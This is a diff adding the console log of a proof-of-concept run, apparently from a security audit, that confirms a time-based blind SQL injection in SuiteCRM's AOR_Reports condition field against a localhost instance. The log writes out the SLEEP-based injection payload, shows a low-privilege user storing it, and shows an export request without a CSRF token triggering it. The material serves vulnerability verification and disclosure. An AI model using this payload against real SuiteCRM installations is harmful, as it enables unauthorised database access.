@@ -1,0 +1,31 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-017/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-017/../.venv
+========================================================================
+VULN-017: AOR_Reports condition `field` raw identifier SQLi (time-based blind)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin session + fresh non-admin user (proves PR:L, not admin-only)
+[OK] created low-priv user user_name=mod_59a703c3 id=597093ef-bec7-49a0-afb6-fbca76dd11ac
+[OK] low-priv web session established
+[STEP] saving 3 AOR_Reports as the low-priv user (report_module=AOK_KnowledgeBase, 1 live row)
+[INFO] baseline report id=137c2ee3-0a64-4b1b-8de6-0b5e9eb36229 (condition field='id', legitimate column)
+[INFO] inject3 report id=d0fb8388-a14e-4a1c-97cc-559c9845e5bb (condition field='id IS NULL OR (SELECT SLEEP(3)))#')
+[INFO] inject2 report id=2899443c-b40c-44e9-aa32-ed5b5bc9e0bd (condition field='id IS NULL OR (SELECT SLEEP(2)))#')
+[STEP] confirming the stored aor_conditions.field row is byte-for-byte our raw payload (db-side verification, not the attack)
+[INFO] db rows:
+id	aor_report_id	field
+ba4d6eea-259d-4d05-a2e9-b02c1c48d39d	137c2ee3-0a64-4b1b-8de6-0b5e9eb36229	id
+53080868-f325-45f2-99af-96fa505960bb	2899443c-b40c-44e9-aa32-ed5b5bc9e0bd	id IS NULL OR (SELECT SLEEP(2)))#
+c4982dd6-53f4-4405-aa8f-63d10f11d18e	d0fb8388-a14e-4a1c-97cc-559c9845e5bb	id IS NULL OR (SELECT SLEEP(3)))#
+mysql: [Warning] Using a password on the command line interface can be insecure.
+[PROOF] aor_conditions.field stored VERBATIM (parens, spaces, '#' all intact) -- confirms no server-side validation/escaping on this write path
+[INFO] live row count of aok_knowledgebase = 2 (SLEEP() is evaluated once per row -- see module docstring); scaling expected delay by this
+[STEP] timing action=export for each report (GET, low-priv session, no CSRF token)
+[INFO] baseline   export elapsed = 0.05s (status 200)
+[INFO] inject SLEEP(2) export elapsed = 4.22s (status 200)
+[PROOF] inject SLEEP(3) export elapsed = 6.20s (status 200)
+[INFO] timing table written to evidence/timing_table.txt
+[INFO] expected delta (row_count=2 x N): SLEEP(2)~=4.0s tol=(2.0, 8.4), SLEEP(3)~=6.0s tol=(3.0, 11.600000000000001)
+[STEP] asserting the real security effect: a measured, proportional SLEEP delay -- never just HTTP 200
+[PROOF] baseline=0.05s, SLEEP(2)->+4.17s, SLEEP(3)->+6.15s: delay tracks the attacker-chosen N almost exactly, proving the AOR_Conditions.field value is interpolated into and executed as live SQL by the WHERE-clause builder.
+==> VULN-017: CONFIRMED — low-priv user mod_59a703c3: baseline 0.05s vs SLEEP(2) +4.17s vs SLEEP(3) +6.15s via AOR_Reports export
